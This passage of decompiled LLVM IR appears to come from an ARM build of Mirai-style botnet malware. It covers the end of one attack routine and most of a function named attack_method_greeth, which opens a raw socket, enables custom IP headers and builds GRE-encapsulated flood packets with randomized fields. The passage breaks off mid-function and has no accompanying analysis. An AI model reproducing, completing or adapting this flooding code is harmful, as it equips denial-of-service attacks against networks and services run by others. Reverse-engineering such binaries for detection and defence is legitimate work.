  %v4_93a8 = add i32 %v3_93a8, 2
  %v5_93a8 = inttoptr i32 %v4_93a8 to i16*
  store i16 %v1_939c, i16* %v5_93a8, align 2
  br i1 %v2_93a4, label %dec_label_pc_9260, label %dec_label_pc_93b0

dec_label_pc_93b0:                                ; preds = %dec_label_pc_9254, %dec_label_pc_939c
  %v0_93b0 = load i32, i32* @r5, align 4
  %v1_93b0 = add i32 %v0_93b0, 28
  store i32 %v1_93b0, i32* %r0.global-to-local, align 4
  store i32 %v0_90c8, i32* %r1.global-to-local, align 4
  %v2_93b8 = inttoptr i32 %v1_93b0 to i16*
  %v3_93b8 = call i32 @rand_str(i16* %v2_93b8, i32 %v0_90c8)
  store i32 %v3_93b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9260

dec_label_pc_93c0:                                ; preds = %dec_label_pc_9034
  %v0_93c0 = load i32, i32* @fp, align 4
  store i32 %v0_93c0, i32* %r0.global-to-local, align 4
  %v1_93c4 = call i32 @__GI___libc_close(i32 %v0_93c0)
  store i32 %v1_93c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_93c8

dec_label_pc_93c8:                                ; preds = %entry, %dec_label_pc_93c0
  %v1_93d0 = phi i32 [ %v3_9024, %entry ], [ %v1_93c4, %dec_label_pc_93c0 ]
  store i32 %v18_8eec, i32* %sb.global-to-local, align 4
  store i32 %v27_8eec, i32* %lr.global-to-local, align 4
  ret i32 %v1_93d0

; uselistorder directives
  uselistorder i32 %v0_939c, { 1, 0 }
  uselistorder i32 %v0_9388, { 1, 0 }
  uselistorder i32 %v1_9380, { 1, 0 }
  uselistorder i32 %v3_92f8, { 2, 1, 3, 0 }
  uselistorder i32 %v1_92d4, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_92a0, { 1, 0 }
  uselistorder i32 %v4_9290, { 1, 0 }
  uselistorder i1 %v2_93a4, { 2, 3, 1, 0 }
  uselistorder i1 %v3_9368, { 3, 2, 0, 1 }
  uselistorder i32 %v3_9114, { 1, 0 }
  uselistorder i16 %rev, { 1, 0 }
  uselistorder i32 %v3_90fc, { 1, 0 }
  uselistorder i32 %v1_90cc, { 1, 0, 2 }
  uselistorder i32 %v1_90c8, { 1, 0, 2 }
  uselistorder i32 %v3_90a0, { 2, 1, 0, 3 }
  uselistorder i32 %v0_9088, { 1, 0, 2, 3 }
  uselistorder i32 %v3_9080, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 %v0_9078, { 1, 0, 2 }
  uselistorder i32 %v0_90c8, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32 %v3_9068, { 3, 1, 2, 0 }
  uselistorder i1 %v7_9054, { 1, 0 }
  uselistorder i1 %v7_9028, { 1, 0 }
  uselistorder i32 %v3_9024, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_9010, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v1_8ffc, { 2, 1, 3, 0 }
  uselistorder i32 %v1_8f88, { 1, 0 }
  uselistorder i32 %v1_8f64, { 1, 0 }
  uselistorder i32 %v6_8f5c, { 1, 0 }
  uselistorder i32 %v7_8f44, { 1, 0, 2, 3 }
  uselistorder i8 %v5_8f40, { 1, 0 }
  uselistorder i32 %v6_8f20, { 1, 0 }
  uselistorder i32 %v2_8f08, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 24, 23, 25, 26, 28, 27, 30, 29, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 7, 5, 9, 8, 11, 10, 12, 15, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 34, 30, 31, 32, 33, 35, 37, 36, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_93c8, { 1, 0 }
  uselistorder label %dec_label_pc_93b0, { 1, 0 }
  uselistorder label %dec_label_pc_9260, { 2, 1, 0 }
  uselistorder label %dec_label_pc_91f4, { 1, 0 }
  uselistorder label %dec_label_pc_91e4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_91e4.preheader, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
}

define i32 @attack_method_greeth(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_93d8 = load i32, i32* @r4, align 4
  %v6_93d8 = load i32, i32* @r5, align 4
  %v24_93d8 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_93f4 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_93f8 = load i32, i32* @r5, align 4
  store i32 %v0_93f8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9408 = load i32, i32* @r4, align 4
  store i32 %v0_9408, i32* %r0.global-to-local, align 4
  %v5_940c = inttoptr i32 %v0_93f8 to i32*
  %v6_940c = call i32 @attack_get_opt_int(i32 %v0_9408, i32* %v5_940c, i32 2, i32 0)
  %v1_9418 = urem i32 %v6_940c, 256
  store i32 %v1_9418, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_9424 = load i32, i32* @r5, align 4
  store i32 %v0_9424, i32* %r1.global-to-local, align 4
  %v0_9428 = load i32, i32* @r4, align 4
  store i32 %v0_9428, i32* %r0.global-to-local, align 4
  %v5_942c = trunc i32 %v6_940c to i8
  %v6_9430 = inttoptr i32 %v0_9424 to i32*
  %v7_9430 = call i32 @attack_get_opt_int(i32 %v0_9428, i32* %v6_9430, i32 3, i32 65535)
  %v0_9434 = load i32, i32* @r5, align 4
  store i32 %v0_9434, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9430, i32* %fp.global-to-local, align 4
  %v0_9444 = load i32, i32* @r4, align 4
  store i32 %v0_9444, i32* %r0.global-to-local, align 4
  %v4_9448 = inttoptr i32 %v0_9434 to i32*
  %v5_9448 = call i32 @attack_get_opt_int(i32 %v0_9444, i32* %v4_9448, i32 4, i32 64)
  %v1_9450 = urem i32 %v5_9448, 256
  store i32 %v1_9450, i32* %ip.global-to-local, align 4
  %v0_9454 = load i32, i32* @r5, align 4
  store i32 %v0_9454, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9460 = load i32, i32* @r4, align 4
  store i32 %v0_9460, i32* %r0.global-to-local, align 4
  %v6_9468 = inttoptr i32 %v0_9454 to i32*
  %v7_9468 = call i32 @attack_get_opt_int(i32 %v0_9460, i32* %v6_9468, i32 5, i32 1)
  %v1_9474 = urem i32 %v7_9468, 256
  store i32 %v1_9474, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_9480 = load i32, i32* @r5, align 4
  store i32 %v0_9480, i32* %r1.global-to-local, align 4
  %v0_9484 = load i32, i32* @r4, align 4
  store i32 %v0_9484, i32* %r0.global-to-local, align 4
  %v5_948c = inttoptr i32 %v0_9480 to i32*
  %v6_948c = call i32 @attack_get_opt_int(i32 %v0_9484, i32* %v5_948c, i32 6, i32 65535)
  %v0_9494 = load i32, i32* @r5, align 4
  store i32 %v0_9494, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_948c, i32* @r8, align 4
  %v0_94a4 = load i32, i32* @r4, align 4
  store i32 %v0_94a4, i32* %r0.global-to-local, align 4
  %v4_94a8 = inttoptr i32 %v0_9494 to i32*
  %v5_94a8 = call i32 @attack_get_opt_int(i32 %v0_94a4, i32* %v4_94a8, i32 7, i32 65535)
  %v0_94ac = load i32, i32* @r5, align 4
  store i32 %v0_94ac, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_94a8, i32* @r7, align 4
  %v0_94bc = load i32, i32* @r4, align 4
  store i32 %v0_94bc, i32* %r0.global-to-local, align 4
  %v4_94c0 = inttoptr i32 %v0_94ac to i32*
  %v5_94c0 = call i32 @attack_get_opt_int(i32 %v0_94bc, i32* %v4_94c0, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_94d0 = load i32, i32* @r5, align 4
  store i32 %v0_94d0, i32* %r1.global-to-local, align 4
  %v0_94d4 = load i32, i32* @r4, align 4
  store i32 %v0_94d4, i32* %r0.global-to-local, align 4
  %v4_94d8 = inttoptr i32 %v0_94d0 to i32*
  %v5_94d8 = call i32 @attack_get_opt_int(i32 %v0_94d4, i32* %v4_94d8, i32 1, i32 1)
  %v1_94e0 = urem i32 %v5_94d8, 256
  store i32 %v1_94e0, i32* %ip.global-to-local, align 4
  %v0_94e4 = load i32, i32* @r5, align 4
  store i32 %v0_94e4, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_94f0 = load i32, i32* @r4, align 4
  store i32 %v0_94f0, i32* %r0.global-to-local, align 4
  %v5_94f8 = inttoptr i32 %v0_94e4 to i32*
  %v6_94f8 = call i32 @attack_get_opt_int(i32 %v0_94f0, i32* %v5_94f8, i32 19, i32 0)
  %v0_9500 = load i32, i32* @r5, align 4
  store i32 %v0_9500, i32* %r1.global-to-local, align 4
  %v2_9504 = load i32, i32* @global_var_243d0.55, align 4
  store i32 %v2_9504, i32* %r3.global-to-local, align 4
  store i32 %v6_94f8, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9510 = load i32, i32* @r4, align 4
  store i32 %v0_9510, i32* %r0.global-to-local, align 4
  %v4_9514 = inttoptr i32 %v0_9500 to i32*
  %v5_9514 = call i32 @attack_get_opt_int(i32 %v0_9510, i32* %v4_9514, i32 25, i32 %v2_9504)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_9528 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_9528, i32* %r0.global-to-local, align 4
  %v7_952c = icmp eq i32 %v3_9528, -1
  store i1 %v7_952c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_952c, label %dec_label_pc_9a40, label %dec_label_pc_9538

dec_label_pc_9538:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_9540 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_9540, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9554 = call i32 @__GI_setsockopt(i32 %v3_9528, i32 0, i32 3, i32 %v6_9540, i32 4)
  store i32 %v5_9554, i32* %r0.global-to-local, align 4
  %v7_9558 = icmp eq i32 %v5_9554, -1
  store i1 %v7_9558, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9558, label %dec_label_pc_9a38, label %dec_label_pc_9560

dec_label_pc_9560:                                ; preds = %dec_label_pc_9538
  %v0_9560 = load i32, i32* @r8, align 4
  %v0_9564 = load i32, i32* @r7, align 4
  %v0_9568 = load i32, i32* %fp.global-to-local, align 4
  %v0_956c = load i32, i32* @r6, align 4
  %v1_956c = urem i32 %v0_956c, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_9574 = urem i32 %v0_9560, 65536
  store i32 %v3_9574, i32* %r3.global-to-local, align 4
  %v3_9578 = urem i32 %v0_9564, 65536
  store i32 %v3_9578, i32* %r4.global-to-local, align 4
  %v0_957c = load i32, i32* @sl, align 4
  %v2_957c = icmp eq i32 %v0_957c, 0
  store i1 %v2_957c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_9594 = urem i32 %v0_9568, 65536
  store i32 %v3_9594, i32* @fp, align 4
  br i1 %v2_957c, label %dec_label_pc_9a4c, label %dec_label_pc_95a4

dec_label_pc_95a4:                                ; preds = %dec_label_pc_9560
  %v3_9564 = mul i32 %v0_9564, 65536
  %v3_9560 = mul i32 %v0_9560, 65536
  %v0_9568.not = or i32 %v0_9568, -65536
  %v1_95a8 = xor i32 %v0_9568.not, 65535
  %v3_95ac = mul i32 %v5_94c0, 65536
  %v1_95b0 = add i32 %v3_95ac, 4325376
  %tmp73 = udiv i32 %v1_95b0, 256
  %v3_95c4 = and i32 %tmp73, 65280
  %tmp74 = mul nsw i32 %v1_95a8, 256
  %v3_95c8 = and i32 %tmp74, 65280
  store i32 %v3_95c8, i32* %ip.global-to-local, align 4
  %v1_95cc = add i32 %v3_95ac, 524288
  %v1_95d4 = add i32 %v3_95ac, 1835008
  %tmp75 = udiv i32 %v1_95a8, 256
  %v4_95d8 = urem i32 %tmp75, 256
  %v5_95d8 = or i32 %v4_95d8, %v3_95c8
  %v4_95e0 = udiv i32 %v1_95b0, 16777216
  %v5_95e0 = or i32 %v3_95c4, %v4_95e0
  store i32 %v5_95e0, i32* @r8, align 4
  %v3_95ec = udiv i32 %v1_95d4, 256
  %tmp76 = mul i32 %v0_9568, 256
  %v3_95f0 = and i32 %tmp76, 65280
  store i32 %v3_9560, i32* %r2.global-to-local, align 4
  %tmp77 = udiv i32 %v0_9568, 256
  %v4_9600 = urem i32 %tmp77, 256
  %v5_9600 = or i32 %v4_9600, %v3_95f0
  store i32 %v5_9600, i32* %r0.global-to-local, align 4
  %tmp78 = mul i32 %v0_9560, 256
  %v3_9604 = and i32 %tmp78, 65280
  %v1_9608 = and i32 %v3_95ec, 65280
  store i32 %v1_9608, i32* @r6, align 4
  store i32 %v3_9564, i32* %r1.global-to-local, align 4
  %tmp79 = mul i32 %v0_9564, 256
  %v3_9614 = and i32 %tmp79, 65280
  %tmp80 = udiv i32 %v0_9560, 256
  %v4_9618 = urem i32 %tmp80, 256
  %v5_9618 = or i32 %v4_9618, %v3_9604
  store i32 %v5_9618, i32* @lr, align 4
  %v4_961c = udiv i32 %v1_95d4, 16777216
  %v5_961c = or i32 %v1_9608, %v4_961c
  store i32 %v5_961c, i32* %r3.global-to-local, align 4
  %tmp81 = udiv i32 %v0_9564, 256
  %v4_9620 = urem i32 %tmp81, 256
  %v5_9620 = or i32 %v4_9620, %v3_9614
  %tmp82 = udiv i32 %v1_95cc, 256
  %v3_9624 = and i32 %tmp82, 65280
  store i32 %v3_9624, i32* @r5, align 4
  %v5_9628 = trunc i32 %v5_9600 to i16
  %v5_9630 = trunc i32 %v5_961c to i16
  %v4_9638 = udiv i32 %v1_95cc, 16777216
  %v5_9638 = or i32 %v3_9624, %v4_9638
  store i32 %v5_9638, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v4_9694 = sext i8 %v5_942c to i32
  %v1_96a0 = trunc i32 %v5_9448 to i8
  %sext = mul nuw i32 %v5_95d8, 65536
  %v4_972c = sdiv i32 %sext, 65536
  %v2_9758 = icmp eq i32 %v1_956c, 0
  %sext8 = mul nuw i32 %v5_9618, 65536
  %v4_9778 = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_9620, 65536
  %v4_9780 = sdiv i32 %sext9, 65536
  %v1_973827 = trunc i32 %v4_972c to i16
  br label %dec_label_pc_9640

dec_label_pc_9640:                                ; preds = %bb85, %dec_label_pc_95a4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_964c = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_964c, i32* %r0.global-to-local, align 4
  %v2_9654 = load i32, i32* @r4, align 4
  %v5_9654 = mul i32 %v2_9654, 4
  %v6_9654 = add i32 %v5_9654, %v2_93f4
  %v7_9654 = inttoptr i32 %v6_9654 to i32*
  store i32 %v2_964c, i32* %v7_9654, align 4
  %v3_9658 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9658, i32* %r2.global-to-local, align 4
  %v5_9660 = mul i32 %v3_9658, 24
  %v1_9664 = load i32, i32* @sb, align 4
  %v2_9664 = add i32 %v1_9664, %v5_9660
  store i32 %v2_9664, i32* @lr, align 4
  store i32 %v2_93f4, i32* %r3.global-to-local, align 4
  %v4_966c = mul i32 %v3_9658, 4
  %v5_966c = add i32 %v4_966c, %v2_93f4
  %v6_966c = inttoptr i32 %v5_966c to i32*
  %v7_966c = load i32, i32* %v6_966c, align 4
  store i32 %v7_966c, i32* %r4.global-to-local, align 4
  %v1_9670 = inttoptr i32 %v7_966c to i8*
  %v2_9670 = load i8, i8* %v1_9670, align 1
  %tmp = urem i8 %v2_9670, 16
  %v1_9674 = zext i8 %tmp to i32
  %v1_9678 = or i32 %v1_9674, 64
  store i32 %v1_9678, i32* %r3.global-to-local, align 4
  %v1_967c = trunc i32 %v1_9678 to i8
  store i8 %v1_967c, i8* %v1_9670, align 1
  %v0_9680 = load i32, i32* %r4.global-to-local, align 4
  %v1_9680 = inttoptr i32 %v0_9680 to i8*
  %v2_9680 = load i8, i8* %v1_9680, align 1
  %v1_9684 = and i8 %v2_9680, -16
  %v1_9688 = or i8 %v1_9684, 5
  store i32 %v1_9474, i32* %r5.global-to-local, align 4
  store i8 %v1_9688, i8* %v1_9680, align 1
  store i32 %v4_9694, i32* %r1.global-to-local, align 4
  %v2_9698 = load i32, i32* %r4.global-to-local, align 4
  %v3_9698 = add i32 %v2_9698, 1
  %v4_9698 = inttoptr i32 %v3_9698 to i8*
  store i8 %v5_942c, i8* %v4_9698, align 1
  store i32 %v1_9450, i32* %r2.global-to-local, align 4
  %v2_96a0 = load i32, i32* %r4.global-to-local, align 4
  %v3_96a0 = add i32 %v2_96a0, 8
  %v4_96a0 = inttoptr i32 %v3_96a0 to i8*
  store i8 %v1_96a0, i8* %v4_96a0, align 1
  %v2_96a8 = load i32, i32* %r4.global-to-local, align 4
  %v3_96a8 = add i32 %v2_96a8, 4
  %v4_96a8 = inttoptr i32 %v3_96a8 to i16*
  store i16 %v5_9628, i16* %v4_96a8, align 2
  %v2_96b0 = load i32, i32* %r4.global-to-local, align 4
  %v3_96b0 = add i32 %v2_96b0, 9
  %v4_96b0 = inttoptr i32 %v3_96b0 to i8*
  store i8 47, i8* %v4_96b0, align 1
  store i32 %v5_9514, i32* %r3.global-to-local, align 4
  %v0_96b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_96b8 = icmp eq i32 %v0_96b8, 0
  store i1 %v2_96b8, i1* %cpsr_z.global-to-local, align 1
  %v1_96bc = load i32, i32* %r4.global-to-local, align 4
  %v2_96bc = add i32 %v1_96bc, 12
  %v3_96bc = inttoptr i32 %v2_96bc to i32*
  store i32 %v5_9514, i32* %v3_96bc, align 4
  br i1 %v2_96b8, label %.thread25, label %bb

bb:                                               ; preds = %dec_label_pc_9640
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_96c4 = load i32, i32* %r4.global-to-local, align 4
  %v4_96c4 = add i32 %v3_96c4, 6
  %v5_96c4 = inttoptr i32 %v4_96c4 to i16*
  store i16 64, i16* %v5_96c4, align 2
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_9640, %bb
  %v0_96c8 = load i32, i32* @lr, align 4
  %v1_96c8 = add i32 %v0_96c8, 16
  %v2_96c8 = inttoptr i32 %v1_96c8 to i32*
  %v3_96c8 = load i32, i32* %v2_96c8, align 4
  store i32 22528, i32* %ip.global-to-local, align 4
  %v1_96d0 = load i32, i32* %r4.global-to-local, align 4
  %v2_96d0 = add i32 %v1_96d0, 16
  %v3_96d0 = inttoptr i32 %v2_96d0 to i32*
  store i32 %v3_96c8, i32* %v3_96d0, align 4
  %v0_96d4 = load i32, i32* %r4.global-to-local, align 4
  %v1_96d4 = add i32 %v0_96d4, 24
  store i32 %v1_96d4, i32* %r1.global-to-local, align 4
  %v1_96d8 = add i32 %v0_96d4, 20
  store i32 %v1_96d8, i32* %r0.global-to-local, align 4
  %v0_96dc = load i32, i32* %ip.global-to-local, align 4
  %v1_96dc = add i32 %v0_96dc, 101
  store i32 %v1_96dc, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_96e8 = load i32, i32* @r8, align 4
  %v1_96e8 = trunc i32 %v0_96e8 to i16
  %v3_96e8 = add i32 %v0_96d4, 2
  %v4_96e8 = inttoptr i32 %v3_96e8 to i16*
  store i16 %v1_96e8, i16* %v4_96e8, align 2
  %v0_96ec = load i32, i32* %ip.global-to-local, align 4
  %v1_96ec = trunc i32 %v0_96ec to i16
  %v2_96ec = load i32, i32* %r0.global-to-local, align 4
  %v3_96ec = add i32 %v2_96ec, 2
  %v4_96ec = inttoptr i32 %v3_96ec to i16*
  store i16 %v1_96ec, i16* %v4_96ec, align 2
  %v0_96f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_96f0 = trunc i32 %v0_96f0 to i8
  %v2_96f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_96f0 = add i32 %v2_96f0, 13
  %v4_96f0 = inttoptr i32 %v3_96f0 to i8*
  store i8 %v1_96f0, i8* %v4_96f0, align 1
  %v0_96f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_96f4 = trunc i32 %v0_96f4 to i8
  %v2_96f4 = load i32, i32* %r1.global-to-local, align 4
  %v3_96f4 = add i32 %v2_96f4, 12
  %v4_96f4 = inttoptr i32 %v3_96f4 to i8*
  store i8 %v1_96f4, i8* %v4_96f4, align 1
  %v0_96f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_96f8 = add i32 %v0_96f8, 38
  %v2_96f8 = inttoptr i32 %v1_96f8 to i8*
  %v3_96f8 = load i8, i8* %v2_96f8, align 1
  %tmp89 = urem i8 %v3_96f8, 16
  %v1_96fc = zext i8 %tmp89 to i32
  %v1_9700 = or i32 %v1_96fc, 64
  store i32 %v1_9700, i32* %r3.global-to-local, align 4
  %v1_9704 = trunc i32 %v1_9700 to i8
  store i8 %v1_9704, i8* %v2_96f8, align 1
  %v0_9708 = load i32, i32* %r4.global-to-local, align 4
  %v1_9708 = add i32 %v0_9708, 38
  %v2_9708 = inttoptr i32 %v1_9708 to i8*
  %v3_9708 = load i8, i8* %v2_9708, align 1
  %v1_970c = and i8 %v3_9708, -16
  %v1_9710 = or i8 %v1_970c, 5
  store i8 %v1_9710, i8* %v2_9708, align 1
  %v0_971c = load i32, i32* %r4.global-to-local, align 4
  %v1_971c = add i32 %v0_971c, 38
  store i32 %v1_971c, i32* @r5, align 4
  %v3_9720 = add i32 %v0_971c, 39
  %v4_9720 = inttoptr i32 %v3_9720 to i8*
  store i8 %v5_942c, i8* %v4_9720, align 1
  store i32 %v5_961c, i32* %r2.global-to-local, align 4
  %v2_9728 = load i32, i32* @r5, align 4
  %v3_9728 = add i32 %v2_9728, 2
  %v4_9728 = inttoptr i32 %v3_9728 to i16*
  store i16 %v5_9630, i16* %v4_9728, align 2
  store i32 %v4_972c, i32* %r3.global-to-local, align 4
  store i32 %v1_9450, i32* %r1.global-to-local, align 4
  %v0_9734 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9734, label %.thread26, label %bb83

.thread26:                                        ; preds = %.thread25
  %v2_973828 = load i32, i32* @r5, align 4
  %v3_973829 = add i32 %v2_973828, 4
  %v4_973830 = inttoptr i32 %v3_973829 to i16*
  store i16 %v1_973827, i16* %v4_973830, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  br label %bb84

bb83:                                             ; preds = %.thread25
  store i32 64, i32* %r2.global-to-local, align 4
  %v2_9738 = load i32, i32* @r5, align 4
  %v3_9738 = add i32 %v2_9738, 4
  %v4_9738 = inttoptr i32 %v3_9738 to i16*
  store i16 %v1_973827, i16* %v4_9738, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  %v1_9740 = load i32, i32* %r2.global-to-local, align 4
  %v2_9740 = trunc i32 %v1_9740 to i16
  %v3_9740 = load i32, i32* @r5, align 4
  %v4_9740 = add i32 %v3_9740, 6
  %v5_9740 = inttoptr i32 %v4_9740 to i16*
  store i16 %v2_9740, i16* %v5_9740, align 2
  br label %bb84

bb84:                                             ; preds = %.thread26, %bb83
  %v0_9744 = load i32, i32* %r1.global-to-local, align 4
  %v1_9744 = trunc i32 %v0_9744 to i8
  %v2_9744 = load i32, i32* @r5, align 4
  %v3_9744 = add i32 %v2_9744, 8
  %v4_9744 = inttoptr i32 %v3_9744 to i8*
  store i8 %v1_9744, i8* %v4_9744, align 1
  %v0_9748 = load i32, i32* %r3.global-to-local, align 4
  %v1_9748 = trunc i32 %v0_9748 to i8
  %v2_9748 = load i32, i32* @r5, align 4
  %v3_9748 = add i32 %v2_9748, 9
  %v4_9748 = inttoptr i32 %v3_9748 to i8*
  store i8 %v1_9748, i8* %v4_9748, align 1
  %v0_974c = call i32 @rand_next()
  store i32 %v0_974c, i32* %r0.global-to-local, align 4
  store i32 %v1_956c, i32* %r1.global-to-local, align 4
  store i1 %v2_9758, i1* %cpsr_z.global-to-local, align 1
  %v1_975c = sub i32 1023, %v0_974c
  store i32 %v1_975c, i32* %r3.global-to-local, align 4
  br i1 %v2_9758, label %.thread, label %.thread10

.thread:                                          ; preds = %bb84
  %v2_9764 = load i32, i32* @r5, align 4
  %v3_9764 = add i32 %v2_9764, 16
  %v4_9764 = inttoptr i32 %v3_9764 to i32*
  store i32 %v1_975c, i32* %v4_9764, align 4
  br label %bb85

.thread10:                                        ; preds = %bb84
  %v1_9760 = load i32, i32* %r4.global-to-local, align 4
  %v2_9760 = add i32 %v1_9760, 16
  %v3_9760 = inttoptr i32 %v2_9760 to i32*
  %v4_9760 = load i32, i32* %v3_9760, align 4
  store i32 %v4_9760, i32* %r3.global-to-local, align 4
  %v2_9768 = load i32, i32* @r5, align 4
  %v3_9768 = add i32 %v2_9768, 16
  %v4_9768 = inttoptr i32 %v3_9768 to i32*
  store i32 %v4_9760, i32* %v4_9768, align 4
  br label %bb85

bb85:                                             ; preds = %.thread, %.thread10
  %v1_976c = load i32, i32* @r5, align 4
  %v2_976c = add i32 %v1_976c, 12
  %v3_976c = inttoptr i32 %v2_976c to i32*
  store i32 %v0_974c, i32* %v3_976c, align 4
  %v3_9770 = load i32, i32* %stack_var_-44, align 4
  %v0_9774 = load i32, i32* %r4.global-to-local, align 4
  %v1_9774 = add i32 %v0_9774, 58
  store i32 %v1_9774, i32* @r6, align 4
  store i32 %v4_9778, i32* %r2.global-to-local, align 4
  %v1_977c = add i32 %v3_9770, 1
  store i32 %v1_977c, i32* @r4, align 4
  store i32 %v4_9780, i32* %r3.global-to-local, align 4
  %v1_9784 = load i32, i32* @sl, align 4
  %v9_9784 = icmp eq i32 %v1_977c, %v1_9784
  store i1 %v9_9784, i1* %cpsr_z.global-to-local, align 1
  %v0_9788 = load i32, i32* @r7, align 4
  %v1_9788 = trunc i32 %v0_9788 to i16
  %v3_9788 = add i32 %v0_9774, 62
  %v4_9788 = inttoptr i32 %v3_9788 to i16*
  store i16 %v1_9788, i16* %v4_9788, align 2
  %v0_978c = load i32, i32* %r2.global-to-local, align 4
  %v1_978c = trunc i32 %v0_978c to i16
  %v2_978c = load i32, i32* @r6, align 4
  %v3_978c = inttoptr i32 %v2_978c to i16*
  store i16 %v1_978c, i16* %v3_978c, align 2
  %v0_9790 = load i32, i32* %r3.global-to-local, align 4
  %v1_9790 = trunc i32 %v0_9790 to i16
  %v2_9790 = load i32, i32* @r6, align 4
  %v3_9790 = add i32 %v2_9790, 2
  %v4_9790 = inttoptr i32 %v3_9790 to i16*
  store i16 %v1_9790, i16* %v4_9790, align 2
  %v0_9794 = load i32, i32* @r4, align 4
  store i32 %v0_9794, i32* %stack_var_-44, align 4
  %v5_9798 = icmp slt i32 %v1_977c, %v1_9784
